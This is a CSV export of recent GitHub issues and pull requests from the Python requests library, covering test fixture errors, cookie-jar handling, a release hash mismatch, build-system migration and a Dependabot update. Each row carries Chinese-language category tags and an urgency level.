id,title,body,category,urgency,html_url
3341146794,recursive dependency involving fixture 'httpbin' detected when running tests,"`recursive dependency involving fixture 'httpbin' detected` when running tests

## Expected Result

tests run or provide actionable error report

## Actual Result

Large part of tests failing to run because of 'recursive dependency'

## Reproduction Steps

`make ci`

```
______________________________________________________________________________________ ERROR at setup of test_content_length_for_string_data_counts_bytes _______________________________________________________________________________________
file /home/hramrach/requests/tests/test_requests.py, line 3032
  @pytest.mark.skipif(
      is_urllib3_1,
      reason=""urllib3 2.x encodes all strings to utf-8, urllib3 1.x uses latin-1"",
  )
  def test_content_length_for_string_data_counts_bytes(httpbin):
file /home/hramrach/requests/tests/conftest.py, line 25
  @pytest.fixture
  def httpbin(httpbin):
E       recursive dependency involving fixture 'httpbin' detected
>       available fixtures: anyio_backend, anyio_backend_name, anyio_backend_options, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, doctest_namespace, httpbin, httpbin_secure, monkeypatch, nosan_server, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory
>       use 'pytest --fixtures [testpath]' for help on them.
```

Probably `httpbin` is missing and because of the way httpbin is used in the test code this cryptic message is produced.

## System Information

    $ python3 -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": ""44.0.3""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.5""
  },
  ""platform"": {
    ""release"": ""6.12.0-160000.19-rt"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30500000"",
    ""version"": ""25.0.0""
  },
  ""requests"": {
    ""version"": ""2.32.4""
  },
  ""system_ssl"": {
    ""version"": ""30500000""
  },
  ""urllib3"": {
    ""version"": ""2.5.0""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}
```

","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/issues/7016
3340976977,Use EmailMessage for response headers,"MockResponse requires EmailMessage for http.CookieJar to be able to
extract cookies from headers but CaseInsensitiveDict is provided.

Use EmailMessage and special-case Set-Cookie per note in
https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.2

Fixes: #7014
","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/7015
3339239966,Cannot use LWPCookiejar with requests,"There is no way to put cookies into a standard cookiejar.

## Expected Result

Cookies can be stored in LWP format

## Actual Result

Cookies are provided in multiple unusable formats, no way to store to a standard jar.

## Reproduction Steps

Make a request that returns multiple cookies. (This is not verified, I do not know how to access _actual headers_ from a `Response` object.)

```
        r = requests.request(method, self.url + path, *args, **kwargs)
        if hasattr(self, 'cookiejar'):
            if 'Set-Cookie' in r.headers or 'Set-Cookie2' in r.headers:
                def get_all(self, name, default=[]):
                    return [self.get(name, default)]  # it's a dictionary, can only have one match anyway
                if not hasattr(r.headers, 'get_all'):
                    r.headers.get_all = types.MethodType(get_all, r.headers)

                self.cookiejar.extract_cookies(requests.cookies.MockResponse(r.headers),
                                               requests.cookies.MockRequest(r.request))
```

`Response` has a `cookies` property but this returns a custom cookie jar which cannot be saved in **LWP** format.

The standard `LWPCookieJar` provides interface for iterating cookies but not storing cookies, only for extracting cookies from headers.

The `Response` object has a `headers` property but this is a **dictionary**, and cannot store _multiple headers_ of the same name correctly. There is nothing stopping the server from sending _multiple_ `Set-Cookie` headers, the standard only requests that no two cookies with the same name be sent. When it does the `Response` `headers` property has a mangled `Set-Cookie` header, and it cannot be parsed by `LWPCookieJar`. `Response` does not provide access to _unmangled headers_ in any way I can find in the documentation.

## System Information

Linux, python 3.6~3.11

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.1.0""
  },
  ""cryptography"": {
    ""version"": ""41.0.3""
  },
  ""idna"": {
    ""version"": ""3.4""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.13""
  },
  ""platform"": {
    ""release"": ""6.4.0-150600.23.47-default"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30100040"",
    ""version"": ""23.2.0""
  },
  ""requests"": {
    ""version"": ""2.31.0""
  },
  ""system_ssl"": {
    ""version"": ""30100040""
  },
  ""urllib3"": {
    ""version"": ""2.0.7""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```
","功能建议, 文档问题",高,https://github.com/psf/requests/issues/7014
3332878377,v2.32.5 wheel file hash doesn't match between PyPI and CI,"Looking at the hashes of the [wheel in PyPI](https://pypi.org/project/requests/#requests-2.32.5-py3-none-any.whl) (and [in the GitHub release](https://github.com/psf/requests/releases/tag/v2.32.5)) and the hash of the uploaded build artefact from [the v2.32.5 publish workflow run](https://github.com/psf/requests/actions/runs/17051830790), they differ:

* PyPI: 2462f94637a34fd532264295e186976db0f5d453d1cdd31473c85a6a161affb6
* GitHub CI: 0f39b052d7ba3d55645a49019311390fc576ea7c2a594f56eb9b67a5388a6e84

I would guess that this is because when the `publish` CI job failed, the distributions were build locally and uploaded manually. In the future, I suggest fetching the build distributions from GitHub CI build artefacts, and publishing those.","Bug反馈, 功能建议",中,https://github.com/psf/requests/issues/7013
3328472280,Migrate build system to hatchling,"This PR follows up on the original [announcement ](https://github.com/psf/requests/releases/tag/v2.32.0) of migrating Requests to be PEP517 compliant backend in 2.33.0. This PR proposes moving to hatchling which has wide adoption, but there's an argument for staying on setuptools. I'd be curious to hear from other maintainers on if there's a strong preference in either direction based on other projects.

@pquentin or @sethmlarson may have input from migrating urllib3 as well. Presumably users with urllib3 2.x are already capable of building with this setup in their environment.","功能建议, 账号问题",中,https://github.com/psf/requests/pull/7012
3328456146,v2.32.5,"2.32.5 (2025-08-18)
-------------------

**Bugfixes**

- The SSLContext caching feature originally introduced in 2.32.0 has created
  a new class of issues in Requests that have had negative impact across a number
  of use cases. The Requests team has decided to revert this feature as long term
  maintenance of it is proving to be unsustainable in its current iteration.

**Deprecations**
- Added support for Python 3.14.
- Dropped support for Python 3.8 following its end of support.","Bug反馈, 功能建议",中,https://github.com/psf/requests/pull/7011
3311815890,Bump actions/checkout from 4.2.0 to 5.0.0,"Bumps [actions/checkout](https://github.com/actions/checkout) from 4.2.0 to 5.0.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/checkout/releases"">actions/checkout's releases</a>.</em></p>
<blockquote>
<h2>v5.0.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Update actions checkout to use node 24 by <a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2226"">actions/checkout#2226</a></li>
<li>Prepare v5.0.0 release by <a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2238"">actions/checkout#2238</a></li>
</ul>
<h2>⚠️ Minimum Compatible Runner Version</h2>
<p><strong>v2.327.1</strong><br />
<a href=""https://github.com/actions/runner/releases/tag/v2.327.1"">Release Notes</a></p>
<p>Make sure your runner is updated to this version or newer to use this release.</p>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4...v5.0.0"">https://github.com/actions/checkout/compare/v4...v5.0.0</a></p>
<h2>v4.3.0</h2>
<h2>What's Changed</h2>
<ul>
<li>docs: update README.md by <a href=""https://github.com/motss""><code>@​motss</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1971"">actions/checkout#1971</a></li>
<li>Add internal repos for checking out multiple repositories by <a href=""https://github.com/mouismail""><code>@​mouismail</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1977"">actions/checkout#1977</a></li>
<li>Documentation update - add recommended permissions to Readme by <a href=""https://github.com/benwells""><code>@​benwells</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2043"">actions/checkout#2043</a></li>
<li>Adjust positioning of user email note and permissions heading by <a href=""https://github.com/joshmgross""><code>@​joshmgross</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2044"">actions/checkout#2044</a></li>
<li>Update README.md by <a href=""https://github.com/nebuk89""><code>@​nebuk89</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2194"">actions/checkout#2194</a></li>
<li>Update CODEOWNERS for actions by <a href=""https://github.com/TingluoHuang""><code>@​TingluoHuang</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2224"">actions/checkout#2224</a></li>
<li>Update package dependencies by <a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2236"">actions/checkout#2236</a></li>
<li>Prepare release v4.3.0 by <a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2237"">actions/checkout#2237</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/motss""><code>@​motss</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1971"">actions/checkout#1971</a></li>
<li><a href=""https://github.com/mouismail""><code>@​mouismail</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1977"">actions/checkout#1977</a></li>
<li><a href=""https://github.com/benwells""><code>@​benwells</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/2043"">actions/checkout#2043</a></li>
<li><a href=""https://github.com/nebuk89""><code>@​nebuk89</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/2194"">actions/checkout#2194</a></li>
<li><a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/2236"">actions/checkout#2236</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4...v4.3.0"">https://github.com/actions/checkout/compare/v4...v4.3.0</a></p>
<h2>v4.2.2</h2>
<h2>What's Changed</h2>
<ul>
<li><code>url-helper.ts</code> now leverages well-known environment variables by <a href=""https://github.com/jww3""><code>@​jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1941"">actions/checkout#1941</a></li>
<li>Expand unit test coverage for <code>isGhes</code> by <a href=""https://github.com/jww3""><code>@​jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1946"">actions/checkout#1946</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.2.1...v4.2.2"">https://github.com/actions/checkout/compare/v4.2.1...v4.2.2</a></p>
<h2>v4.2.1</h2>
<h2>What's Changed</h2>
<ul>
<li>Check out other refs/* by commit if provided, fall back to ref by <a href=""https://github.com/orhantoy""><code>@​orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1924"">actions/checkout#1924</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/Jcambass""><code>@​Jcambass</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1919"">actions/checkout#1919</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.2.0...v4.2.1"">https://github.com/actions/checkout/compare/v4.2.0...v4.2.1</a></p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/actions/checkout/blob/main/CHANGELOG.md"">actions/checkout's changelog</a>.</em></p>
<blockquote>
<h1>Changelog</h1>
<h2>V5.0.0</h2>
<ul>
<li>Update actions checkout to use node 24 by <a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2226"">actions/checkout#2226</a></li>
</ul>
<h2>V4.3.0</h2>
<ul>
<li>docs: update README.md by <a href=""https://github.com/motss""><code>@​motss</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1971"">actions/checkout#1971</a></li>
<li>Add internal repos for checking out multiple repositories by <a href=""https://github.com/mouismail""><code>@​mouismail</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1977"">actions/checkout#1977</a></li>
<li>Documentation update - add recommended permissions to Readme by <a href=""https://github.com/benwells""><code>@​benwells</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2043"">actions/checkout#2043</a></li>
<li>Adjust positioning of user email note and permissions heading by <a href=""https://github.com/joshmgross""><code>@​joshmgross</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2044"">actions/checkout#2044</a></li>
<li>Update README.md by <a href=""https://github.com/nebuk89""><code>@​nebuk89</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2194"">actions/checkout#2194</a></li>
<li>Update CODEOWNERS for actions by <a href=""https://github.com/TingluoHuang""><code>@​TingluoHuang</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2224"">actions/checkout#2224</a></li>
<li>Update package dependencies by <a href=""https://github.com/salmanmkc""><code>@​salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2236"">actions/checkout#2236</a></li>
</ul>
<h2>v4.2.2</h2>
<ul>
<li><code>url-helper.ts</code> now leverages well-known environment variables by <a href=""https://github.com/jww3""><code>@​jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1941"">actions/checkout#1941</a></li>
<li>Expand unit test coverage for <code>isGhes</code> by <a href=""https://github.com/jww3""><code>@​jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1946"">actions/checkout#1946</a></li>
</ul>
<h2>v4.2.1</h2>
<ul>
<li>Check out other refs/* by commit if provided, fall back to ref by <a href=""https://github.com/orhantoy""><code>@​orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1924"">actions/checkout#1924</a></li>
</ul>
<h2>v4.2.0</h2>
<ul>
<li>Add Ref and Commit outputs by <a href=""https://github.com/lucacome""><code>@​lucacome</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1180"">actions/checkout#1180</a></li>
<li>Dependency updates by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a>- <a href=""https://redirect.github.com/actions/checkout/pull/1777"">actions/checkout#1777</a>, <a href=""https://redirect.github.com/actions/checkout/pull/1872"">actions/checkout#1872</a></li>
</ul>
<h2>v4.1.7</h2>
<ul>
<li>Bump the minor-npm-dependencies group across 1 directory with 4 updates by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1739"">actions/checkout#1739</a></li>
<li>Bump actions/checkout from 3 to 4 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1697"">actions/checkout#1697</a></li>
<li>Check out other refs/* by commit by <a href=""https://github.com/orhantoy""><code>@​orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1774"">actions/checkout#1774</a></li>
<li>Pin actions/checkout's own workflows to a known, good, stable version. by <a href=""https://github.com/jww3""><code>@​jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1776"">actions/checkout#1776</a></li>
</ul>
<h2>v4.1.6</h2>
<ul>
<li>Check platform to set archive extension appropriately by <a href=""https://github.com/cory-miller""><code>@​cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1732"">actions/checkout#1732</a></li>
</ul>
<h2>v4.1.5</h2>
<ul>
<li>Update NPM dependencies by <a href=""https://github.com/cory-miller""><code>@​cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1703"">actions/checkout#1703</a></li>
<li>Bump github/codeql-action from 2 to 3 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1694"">actions/checkout#1694</a></li>
<li>Bump actions/setup-node from 1 to 4 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1696"">actions/checkout#1696</a></li>
<li>Bump actions/upload-artifact from 2 to 4 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1695"">actions/checkout#1695</a></li>
<li>README: Suggest <code>user.email</code> to be <code>41898282+github-actions[bot]@users.noreply.github.com</code> by <a href=""https://github.com/cory-miller""><code>@​cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1707"">actions/checkout#1707</a></li>
</ul>
<h2>v4.1.4</h2>
<ul>
<li>Disable <code>extensions.worktreeConfig</code> when disabling <code>sparse-checkout</code> by <a href=""https://github.com/jww3""><code>@​jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1692"">actions/checkout#1692</a></li>
<li>Add dependabot config by <a href=""https://github.com/cory-miller""><code>@​cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1688"">actions/checkout#1688</a></li>
<li>Bump the minor-actions-dependencies group with 2 updates by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1693"">actions/checkout#1693</a></li>
<li>Bump word-wrap from 1.2.3 to 1.2.5 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1643"">actions/checkout#1643</a></li>
</ul>
<h2>v4.1.3</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/checkout/commit/08c6903cd8c0fde910a37f88322edcfb5dd907a8""><code>08c6903</code></a> Prepare v5.0.0 release (<a href=""https://redirect.github.com/actions/checkout/issues/2238"">#2238</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/9f265659d3bb64ab1440b03b12f4d47a24320917""><code>9f26565</code></a> Update actions checkout to use node 24 (<a href=""https://redirect.github.com/actions/checkout/issues/2226"">#2226</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/08eba0b27e820071cde6df949e0beb9ba4906955""><code>08eba0b</code></a> Prepare release v4.3.0 (<a href=""https://redirect.github.com/actions/checkout/issues/2237"">#2237</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/631c7dc4f80f88219c5ee78fee08c6b62fac8da1""><code>631c7dc</code></a> Update package dependencies (<a href=""https://redirect.github.com/actions/checkout/issues/2236"">#2236</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/8edcb1bdb4e267140fa742c62e395cd74f332709""><code>8edcb1b</code></a> Update CODEOWNERS for actions (<a href=""https://redirect.github.com/actions/checkout/issues/2224"">#2224</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/09d2acae674a48949e3602304ab46fd20ae0c42f""><code>09d2aca</code></a> Update README.md (<a href=""https://redirect.github.com/actions/checkout/issues/2194"">#2194</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/85e6279cec87321a52edac9c87bce653a07cf6c2""><code>85e6279</code></a> Adjust positioning of user email note and permissions heading (<a href=""https://redirect.github.com/actions/checkout/issues/2044"">#2044</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/009b9ae9e446ad8d9b8c809870b0fbcc5e03573e""><code>009b9ae</code></a> Documentation update - add recommended permissions to Readme (<a href=""https://redirect.github.com/actions/checkout/issues/2043"">#2043</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/cbb722410c2e876e24abbe8de2cc27693e501dcb""><code>cbb7224</code></a> Update README.md (<a href=""https://redirect.github.com/actions/checkout/issues/1977"">#1977</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/3b9b8c884f6b4bb4d5be2779c26374abadae0871""><code>3b9b8c8</code></a> docs: update README.md (<a href=""https://redirect.github.com/actions/checkout/issues/1971"">#1971</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/actions/checkout/compare/v4.2.0...08c6903cd8c0fde910a37f88322edcfb5dd907a8"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/checkout&package-manager=github_actions&previous-version=4.2.0&new-version=5.0.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bug反馈, 功能建议, 账号问题, 文档问题",高,https://github.com/psf/requests/pull/7010
3307532080,Add test for RequestsCookieJar zero and empty string value handling,"This pull request adds a test that verifies RequestsCookieJar correctly handles cookies with zero and empty string values.
I noticed there are already fixes related to this issue (#7003), but no corresponding test was included.
Therefore, this PR adds the missing test to ensure no regressions happen in the future.

No changes to production code are included, only the test to improve coverage.","Bug反馈, 功能建议",中,https://github.com/psf/requests/pull/7009
3305146816,fix: allow empty string and zero values to be retrieved from RequestsCookieJar,"### Summary
Fixes an issue (#7003) where cookies with an empty string ('') or zero (0) value were treated as missing.

### Changes
- Updated _find_no_duplicates to check `is not None` instead of truthiness.
- Added unit test to verify behavior.

Fixes #7003 ","Bug反馈, 功能建议",中,https://github.com/psf/requests/pull/7008
3295700664,Make the SSL version more human-readable,"When executing `python -m requests.help`, the previous format looked like:
```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": ""40.0.2""
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.6.8""
  },
  ""platform"": {
    ""release"": ""3.10.0-1160.119.1.el7.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30100000"",
    ""version"": ""23.2.0""
  },
  ""requests"": {
    ""version"": ""2.27.1""
  },
  ""system_ssl"": {
    ""version"": ""100020bf""
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```

The current format looks like:
```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": ""40.0.2""
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.6.8""
  },
  ""platform"": {
    ""release"": ""3.10.0-1160.119.1.el7.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""OpenSSL 3.1.0 14 Mar 2023"", 
    ""version"": ""23.2.0""
  },
  ""requests"": {
    ""version"": ""2.27.1""
  },
  ""system_ssl"": {
    ""version"": ""OpenSSL 1.0.2k-fips  26 Jan 2017"" 
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}

```",功能建议,中,https://github.com/psf/requests/pull/7007
